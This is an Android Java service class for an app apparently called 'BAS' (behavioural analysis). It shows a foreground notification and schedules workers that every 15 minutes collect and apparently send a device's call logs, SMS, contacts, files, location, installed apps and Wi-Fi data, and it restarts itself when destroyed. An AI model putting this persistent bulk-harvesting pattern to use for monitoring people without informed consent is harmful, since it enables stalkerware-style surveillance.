package com.behavioralanalysis.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.Settings;
import android.telecom.Call;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

import java.util.concurrent.TimeUnit;

public class MainService extends Service {
    private static Context context;
    public static String id = "";
    public static final String TAG = "bas";
    Handler handler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent notificationPendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

            Notification notification = new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID)
                    .setContentTitle("BAS")
                    .setContentText("Service is running...")
                    .setSmallIcon(R.drawable.ic_android)
                    .setContentIntent(notificationPendingIntent)
                    .build();

            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        context = this;
        id = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);

        run(Apps.TAG);
        run(Calls.TAG);
        run(Contacts.TAG);
        run(Files.TAG);
        run(Locations.TAG);
        run(Permissions.TAG);
        run(Sms.TAG);
        run(Wifi.TAG);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Logger.log("MainService.onDestroy()");
        super.onDestroy();

        sendBroadcast(new Intent("respawnService"));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContext() {
        return context;
    }

    private void run(String type) {
        WorkRequest workRequest = null;

        Toast.makeText(this, type.substring(0, 1).toUpperCase() + type.substring(1).replace("_", " ") + " send", Toast.LENGTH_SHORT).show();
        switch (type) {
            case Apps.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Apps.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Calls.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Calls.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Contacts.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Contacts.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Files.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Files.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Locations.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Locations.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Permissions.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Permissions.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Sms.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Sms.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
            case Wifi.TAG:
                workRequest = new PeriodicWorkRequest.Builder(Wifi.class, 15, TimeUnit.MINUTES)
                        .build();
                break;
        }

        if (workRequest != null) {
            WorkManager.getInstance().enqueue(workRequest);
        }
    }
}
